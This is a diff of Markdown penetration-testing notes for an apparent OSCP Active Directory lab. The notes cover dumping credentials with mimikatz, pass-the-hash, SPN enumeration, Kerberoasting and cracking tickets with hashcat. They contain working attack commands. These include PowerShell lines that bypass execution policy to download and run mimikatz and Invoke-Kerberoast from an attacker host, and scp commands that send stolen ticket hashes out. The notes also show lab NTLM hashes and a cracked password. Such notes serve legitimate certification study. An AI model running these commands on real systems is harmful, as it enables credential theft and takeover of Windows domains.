@@ -92,14 +92,14 @@ Nmap done: 3 IP addresses (3 hosts up) scanned in 342.02 seconds
 
 # 1. Cached Credential Storage and Retrieval
 
-**On Kali**: Setup web server to host `mimikatz`
+**On Kali:** Setup web server to host `mimikatz`
 
 ```console
 cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe .
 sudo python3 -m http.server 80 &> /dev/null &
 ```
 
-**On Target**: Download and run `mimikatz`
+**On Target:** Download and run `mimikatz`
 
 - Download: `(New-Object System.Net.WebClient).DownloadFile()`
 - Run: `Start-Process`
@@ -108,7 +108,7 @@ sudo python3 -m http.server 80 &> /dev/null &
 powershell.exe -NoProfile -ExecutionPolicy Bypass (New-Object System.Net.WebClient).DownloadFile('http://kali.vx/mimikatz.exe', $env:APPDATA + '\mimikatz.exe'); Start-Process $env:APPDATA\mimikatz.exe
 ```
 
-**On Target**: mimikatz commands
+**On Target:** mimikatz commands
 
 - Ref: <https://tools.thehacker.recipes/mimikatz>
 
@@ -159,25 +159,7 @@ User : Administrator
   Hash NTLM: e19ccf75ee54e06b06a5907af13cef42
 
 Supplemental Credentials:
-* Primary:NTLM-Strong-NTOWF *
-    Random Value : d0e4eff03c20be1cf228acad5ae9dffa
-
-* Primary:Kerberos-Newer-Keys *
-    Default Salt : DESKTOP-GKEGHIVAdministrator
-    Default Iterations : 4096
-    Credentials
-      aes256_hmac       (4096) : 56498ceffdf35f16cffb36744b2f98f76955058b3918c827e173fc7aa401f31f
-      aes128_hmac       (4096) : 1f052f941e6b84ff8df58a0157dd7b25
-      des_cbc_md5       (4096) : d5612916b59bad51
-
-* Packages *
-    NTLM-Strong-NTOWF
-
-* Primary:Kerberos *
-    Default Salt : DESKTOP-GKEGHIVAdministrator
-    Credentials
-      des_cbc_md5       : d5612916b59bad51
-
+⋮
 
 RID  : 000001f5 (501)
 User : Guest
@@ -190,25 +172,7 @@ User : WDAGUtilityAccount
   Hash NTLM: 5a2b1b78290d381def497905d467fcff
 
 Supplemental Credentials:
-* Primary:NTLM-Strong-NTOWF *
-    Random Value : b848a29d177ddaf268c55ff8b0a27e40
-
-* Primary:Kerberos-Newer-Keys *
-    Default Salt : WDAGUtilityAccount
-    Default Iterations : 4096
-    Credentials
-      aes256_hmac       (4096) : fd924dec8a07c294a448fe64a59d6253b11700fd8b9ba0b04914baca366adee8
-      aes128_hmac       (4096) : a09548edf5d6ef88615586ad4315d147
-      des_cbc_md5       (4096) : 982a37cb1998d66e
-
-* Packages *
-    NTLM-Strong-NTOWF
-
-* Primary:Kerberos *
-    Default Salt : WDAGUtilityAccount
-    Credentials
-      des_cbc_md5       : 982a37cb1998d66e
-
+⋮
 
 RID  : 000003eb (1003)
 User : localadmin
@@ -217,24 +181,7 @@ User : localadmin
     ntlm- 0: e19ccf75ee54e06b06a5907af13cef42
 
 Supplemental Credentials:
-* Primary:NTLM-Strong-NTOWF *
-    Random Value : 35807c03d79f70538886cc1f45212e9c
-
-* Primary:Kerberos-Newer-Keys *
-    Default Salt : CLIENT.LAB.VXlocaladmin
-    Default Iterations : 4096
-    Credentials
-      aes256_hmac       (4096) : 0cbf515a0f766032f6c3d226bebbb2de3ff3252c0107d545839a11da9ea0d723
-      aes128_hmac       (4096) : 4541dc99ef9a196bfa67fdb81098a8e3
-      des_cbc_md5       (4096) : ecd6e0d6237ca19e
-
-* Packages *
-    NTLM-Strong-NTOWF
-
-* Primary:Kerberos *
-    Default Salt : CLIENT.LAB.VXlocaladmin
-    Credentials
-      des_cbc_md5       : ecd6e0d6237ca19e
+⋮
 ```
 
 ## 1.2. Successful `lsadump::lsa /patch` example
@@ -288,18 +235,7 @@ SID               : S-1-5-21-1470288461-3401294743-676794760-1105
          * NTLM     : e19ccf75ee54e06b06a5907af13cef42
          * SHA1     : 9131834cf4378828626b1beccaa5dea2c46f9b63
          * DPAPI    : 0c6f0ff405f11531e7cd38a3f89ad32f
-        tspkg :
-        wdigest :
-         * Username : mike
-         * Domain   : LAB
-         * Password : (null)
-        kerberos :
-         * Username : mike
-         * Domain   : LAB.VX
-         * Password : (null)
-        ssp :
-        credman :
-        cloudap :
+        ⋮
 
 Authentication Id : 0 ; 3508055 (00000000:00358757)
 Session           : Interactive from 1
@@ -315,18 +251,7 @@ SID               : S-1-5-21-1470288461-3401294743-676794760-1104
          * NTLM     : e19ccf75ee54e06b06a5907af13cef42
          * SHA1     : 9131834cf4378828626b1beccaa5dea2c46f9b63
          * DPAPI    : 66880edfa688d3f7b7ab4a215cee53a7
-        tspkg :
-        wdigest :
-         * Username : domainadmin
-         * Domain   : LAB
-         * Password : (null)
-        kerberos :
-         * Username : domainadmin
-         * Domain   : LAB.VX
-         * Password : (null)
-        ssp :
-        credman :
-        cloudap :
+        ⋮
 
 ••• OUTPUT TRUNCATED •••
 ```
@@ -391,20 +316,7 @@ domain  : lab.vx
 program : cmd.exe
 impers. : no
 NTLM    : e19ccf75ee54e06b06a5907af13cef42
-  |  PID  2536
-  |  TID  7400
-  |  LSA Process is now R/W
-  |  LUID 0 ; 10105231 (00000000:009a318f)
-  \_ msv1_0   - data copy @ 00000129DC857510 : OK !
-  \_ kerberos - data copy @ 00000129DC9DA8C8
-   \_ des_cbc_md4       -> null
-   \_ des_cbc_md4       OK
-   \_ des_cbc_md4       OK
-   \_ des_cbc_md4       OK
-   \_ des_cbc_md4       OK
-   \_ des_cbc_md4       OK
-   \_ des_cbc_md4       OK
-   \_ *Password replace @ 00000129DC9D00E8 (32) -> null
+⋮
 ```
 
 - Connect to the target machine in the new cmd window
@@ -447,20 +359,7 @@ domain  : *
 program : cmd.exe
 impers. : no
 NTLM    : e19ccf75ee54e06b06a5907af13cef42
-  |  PID  6872
-  |  TID  5672
-  |  LSA Process was already R/W
-  |  LUID 0 ; 13220694 (00000000:00c9bb56)
-  \_ msv1_0   - data copy @ 00000129DC9C5AB0 : OK !
-  \_ kerberos - data copy @ 00000129DC9D8288
-   \_ des_cbc_md4       -> null
-   \_ des_cbc_md4       OK
-   \_ des_cbc_md4       OK
-   \_ des_cbc_md4       OK
-   \_ des_cbc_md4       OK
-   \_ des_cbc_md4       OK
-   \_ des_cbc_md4       OK
-   \_ *Password replace @ 00000129DBEE4128 (32) -> null
+⋮
 ```
 
 - Connect to the target machine in the new cmd window
@@ -498,44 +397,13 @@ SVR
 C:\Users\mike>setspn -Q */*
 Checking domain DC=lab,DC=vx
 CN=krbtgt,CN=Users,DC=lab,DC=vx
-        kadmin/changepw
+        ⋮
 CN=SVR,CN=Computers,DC=lab,DC=vx
-        TERMSRV/SVR
-        TERMSRV/SVR.lab.vx
-        RestrictedKrbHost/SVR
-        HOST/SVR
-        RestrictedKrbHost/SVR.lab.vx
-        HOST/SVR.lab.vx
+        ⋮
 CN=CLIENT,CN=Computers,DC=lab,DC=vx
-        TERMSRV/CLIENT
-        TERMSRV/CLIENT.lab.vx
-        RestrictedKrbHost/CLIENT
-        HOST/CLIENT
-        RestrictedKrbHost/CLIENT.lab.vx
-        HOST/CLIENT.lab.vx
+        ⋮
 CN=DC,OU=Domain Controllers,DC=lab,DC=vx
-        Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/DC.lab.vx
-        ldap/DC.lab.vx/ForestDnsZones.lab.vx
-        ldap/DC.lab.vx/DomainDnsZones.lab.vx
-        TERMSRV/DC
-        TERMSRV/DC.lab.vx
-        DNS/DC.lab.vx
-        GC/DC.lab.vx/lab.vx
-        RestrictedKrbHost/DC.lab.vx
-        RestrictedKrbHost/DC
-        RPC/cba15170-f237-42f7-a29f-3a1cd3cb839e._msdcs.lab.vx
-        HOST/DC/LAB
-        HOST/DC.lab.vx/LAB
-        HOST/DC
-        HOST/DC.lab.vx
-        HOST/DC.lab.vx/lab.vx
-        E3514235-4B06-11D1-AB04-00C04FC2DCD2/cba15170-f237-42f7-a29f-3a1cd3cb839e/lab.vx
-        ldap/DC/LAB
-        ldap/cba15170-f237-42f7-a29f-3a1cd3cb839e._msdcs.lab.vx
-        ldap/DC.lab.vx/LAB
-        ldap/DC
-        ldap/DC.lab.vx
-        ldap/DC.lab.vx/lab.vx
+        ⋮
 CN=MSSQL Service Account,OU=OSCP Lab,DC=lab,DC=vx
         MSSQLSvc/SVR.lab.vx:1433
         MSSQLSvc/SVR.lab.vx
@@ -543,7 +411,9 @@ CN=MSSQL Service Account,OU=OSCP Lab,DC=lab,DC=vx
 Existing SPN found!
 ```
 
-## 3.2. Request Tickets
+## 3.2. Kerberoasting
+
+### 3.2.1. Option 1 - Extracting service account hash with mimikatz + kerberoast package
 
 #### Request tickets from PowerShell
 
@@ -552,7 +422,7 @@ Add-Type -AssemblyName System.IdentityModel
 New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList MSSQLSvc/SVR.lab.vx:1433
 ```
 
-#### Sample Results
+**Sample Results:**
 
 ```console
 PS C:\Users\mike> klist
@@ -561,18 +431,9 @@ Current LogonId is 0:0xa48995
 
 Cached Tickets: (3)
 
-#0>     Client: mike @ LAB.VX
-        Server: krbtgt/LAB.VX @ LAB.VX
-        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
-        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
-        Start Time: 4/16/2022 9:53:54 (local)
-        End Time:   4/16/2022 19:53:54 (local)
-        Renew Time: 4/23/2022 9:53:54 (local)
-        Session Key Type: AES-256-CTS-HMAC-SHA1-96
-        Cache Flags: 0x1 -> PRIMARY
-        Kdc Called: DC.lab.vx
+⋮
 
-#1>     Client: mike @ LAB.VX
+#2>     Client: mike @ LAB.VX
         Server: MSSQLSvc/SVR.lab.vx:1433 @ LAB.VX
         KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
         Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize
@@ -583,126 +444,59 @@ Cached Tickets: (3)
         Cache Flags: 0
         Kdc Called: DC.lab.vx
 
-#2>     Client: mike @ LAB.VX
-        Server: ldap/DC.lab.vx/lab.vx @ LAB.VX
-        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
-        Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
-        Start Time: 4/16/2022 9:55:16 (local)
-        End Time:   4/16/2022 19:53:54 (local)
-        Renew Time: 4/23/2022 9:53:54 (local)
-        Session Key Type: AES-256-CTS-HMAC-SHA1-96
-        Cache Flags: 0
-        Kdc Called: DC.lab.vx
+⋮
 ```
 
-## 3.3. Kerberoasting with mimikatz
-
-### 3.3.1. Dump tickets
+#### Dump tickets using mimikatz
 
 - ☝️ **Note**: to retrieve user kerberos tickets, do **NOT** use `privilege::debug` + `token::elevate` in mimikatz; doing so impersonates the `SYSTEM` token and ends up retrieving machine kerberos tickets instead
 
 ```console
 mimikatz # kerberos::list /export
 
-[00000000] - 0x00000012 - aes256_hmac
-   Start/End/MaxRenew: 16/4/2022 9:53:54 am ; 16/4/2022 7:53:54 pm ; 23/4/2022 9:53:54 am
-   Server Name       : krbtgt/LAB.VX @ LAB.VX
-   Client Name       : mike @ LAB.VX
-   Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ;
-   * Saved to file     : 0-40e10000-mike@krbtgt~LAB.VX-LAB.VX.kirbi
+⋮
 
 [00000001] - 0x00000017 - rc4_hmac_nt
    Start/End/MaxRenew: 16/4/2022 10:00:51 am ; 16/4/2022 7:53:54 pm ; 23/4/2022 9:53:54 am
    Server Name       : MSSQLSvc/SVR.lab.vx:1433 @ LAB.VX
    Client Name       : mike @ LAB.VX
    Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ;
-   * Saved to file     : 1-40a10000-mike@MSSQLSvc~SVR.lab.vx~1433-LAB.VX.kirbi
+   * Saved to file     : 2-40a10000-mike@MSSQLSvc~SVR.lab.vx~1433-LAB.VX.kirbi
 
-[00000002] - 0x00000012 - aes256_hmac
-   Start/End/MaxRenew: 16/4/2022 9:55:16 am ; 16/4/2022 7:53:54 pm ; 23/4/2022 9:53:54 am
-   Server Name       : ldap/DC.lab.vx/lab.vx @ LAB.VX
-   Client Name       : mike @ LAB.VX
-   Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
-   * Saved to file     : 2-40a50000-mike@ldap~DC.lab.vx~lab.vx-LAB.VX.kirbi
+⋮
 ```
 
 - ☝️ **Note**: In event of `ERROR kuhl_m_kerberos_list ; kull_m_file_writeData (0x00000005)` error, check that the user has permissions to write to the present working directory
 - e.g. Attempting to run `C:\Windows\System32\cmd.exe` as a non-admin user works, but attempting to use mimikatz to save tickets to `C:\Windows\System32\` will result in write errors
 
-### 3.3.2. Use the Kerberoast package to crack the service ticket
-
-- Ref: <https://github.com/nidem/kerberoast>
-
 #### Upload the ticket to Kali
-
-**On Target**:
 
 ```console
 scp <ticket> kali@kali.vx:/home/kali/
 ```
 
+#### Use the Kerberoast package to extract the hash from the service ticket
+
 #### Install kerberoast module
+
+- Ref: <https://github.com/nidem/kerberoast>
 
 ```console
 sudo apt -y install kerberoast
 ```
 
-#### Prepare word list
+### 3.2.2. Option 2 - Extracting service account hash directly with Invoke-Kerberoast script from powershell-empire
 
-- Unpack existing `rockyou.txt` (❗14 million entries❗)
+#### Dump password hash
 
-```console
-┌──(kali㉿kali)-[~]
-└─$ sudo gzip -d /usr/share/wordlists/rockyou.txt.gz
-```
-
-- Using the original `rockyou.txt` will take a long time
-- The rockyou list is sorted by popularity, use `head` to extract the top passwords for a more efficient crack (if the password is not in the top 100,000, probably bruteforce isn't the way to go)
-
-```console
-┌──(kali㉿kali)-[~]
-└─$ sudo head -n 100000 /usr/share/wordlists/rockyou.txt >> rockyou.100k
-```
-
-- Time taken for kerberoast:
-
-| Number of passwords | Time taken |
-|---|---|
-| 10,000 | 0m4.974s |
-| 100,000 | 0m47.707s |
-| 1,000,000 | 8m14.453s |
-
-#### Crack the ticket
-
-```console
-┌──(kali㉿kali)-[~]
-└─$ time python3 /usr/share/kerberoast/tgsrepcrack.py rockyou.100k 1-40a10000-mike@MSSQLSvc~SVR.lab.vx~1433-LAB.VX.kirbi
-
-
-    USE HASHCAT, IT'S HELLA FASTER!!
-
-
-Cracking 1 tickets...
-found password for ticket 0: P@ssw0rd  File: 1-40a10000-mike@MSSQLSvc~SVR.lab.vx~1433-LAB.VX.kirbi
-Successfully cracked all tickets
-
-real    0m47.861s
-user    0m47.828s
-sys     0m0.016s
-```
-
-## 3.4. Kerberoasting with PowerShell
-
-### 3.4.1. Dump password hash
-
-**On Kali**: Setup web server to host `Invoke-Kerberoast.ps1`
+**On Kali:** Setup web server to host `Invoke-Kerberoast.ps1`
 
 ```console
 cp /usr/share/powershell-empire/empire/server/data/module_source/credentials/Invoke-Kerberoast.ps1 .
 sudo python3 -m http.server 80 &> /dev/null &
 ```
 
-**On Target**: Download and run `Invoke-Kerberoast`
+**On Target:** Download and run `Invoke-Kerberoast`
 
 - Download: `(New-Object System.Net.WebClient).DownloadFile()`
 - Run: `Invoke-Kerberoast`
@@ -711,21 +505,28 @@ sudo python3 -m http.server 80 &> /dev/null &
 powershell.exe -NoProfile -ExecutionPolicy Bypass "Invoke-Expression (New-Object System.Net.WebClient).DownloadString('http://kali.vx/Invoke-Kerberoast.ps1'); Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII tgs.hash"
 ```
 
-### 3.4.2. Use the hashcat to crack the service ticket
+**On Target:** Upload the hash to Kali
+
+```console
+scp tgs.hash kali@kali.vx:/home/kali/
+```
+
+## 3.3. Cracking service account hash using hashcat
+
+#### Unpack existing `rockyou.txt` (❗14 million records❗)
+
+```console
+┌──(kali㉿kali)-[~]
+└─$ sudo gzip -d /usr/share/wordlists/rockyou.txt.gz
+```
+
+#### Use the hashcat to crack the service ticket
 
 ❗USE HASHCAT, IT'S HELLA FASTER❗
 
 It doesn't matter that `rockyou.txt` has 14 million records, the time taken by hashcat is about the same
 - Hashcat takes about **27s** to build a dictionary cache of the wordlist
 - If there is a cache hit, cracking the password takes only about **2.7s**
-
-#### Upload the hash to Kali
-
-**On Target**: 
-
-```console
-scp tgs.hash kali@kali.vx:/home/kali/
-```
 
 #### Crack the hash
 
@@ -794,6 +595,38 @@ Stopped: Wed Oct 26 20:52:13 2022
 real    0m27.158s
 user    0m25.597s
 sys     0m0.333s
+```
+
+## 3.4. Cracking .kirbi ticket using tgsrepcrack.py (not recommended)
+
+- It is possible to crack the .kirbi ticket exported from mimikatz directing using the `tgsrepcrack.py` script, but it is extremely slow compared to hashcat
+- Time taken for `tgsrepcrack.py`:
+
+| Number of passwords | Time taken |
+|---|---|
+| 10,000 | 0m4.974s |
+| 100,000 | 0m47.707s |
+| 1,000,000 | 8m14.453s |
+
+- Using the full `rockyou.txt`, which as 14 million records, is near impossible using this method
+
+#### Crack the ticket
+
+```console
+┌──(kali㉿kali)-[~]
+└─$ time python3 /usr/share/kerberoast/tgsrepcrack.py rockyou.100k 1-40a10000-mike@MSSQLSvc~SVR.lab.vx~1433-LAB.VX.kirbi
+
+
+    USE HASHCAT, IT'S HELLA FASTER!!
+
+
+Cracking 1 tickets...
+found password for ticket 0: P@ssw0rd  File: 1-40a10000-mike@MSSQLSvc~SVR.lab.vx~1433-LAB.VX.kirbi
+Successfully cracked all tickets
+
+real    0m47.861s
+user    0m47.828s
+sys     0m0.016s
 ```
 
 ## 3.5. Silver Ticket
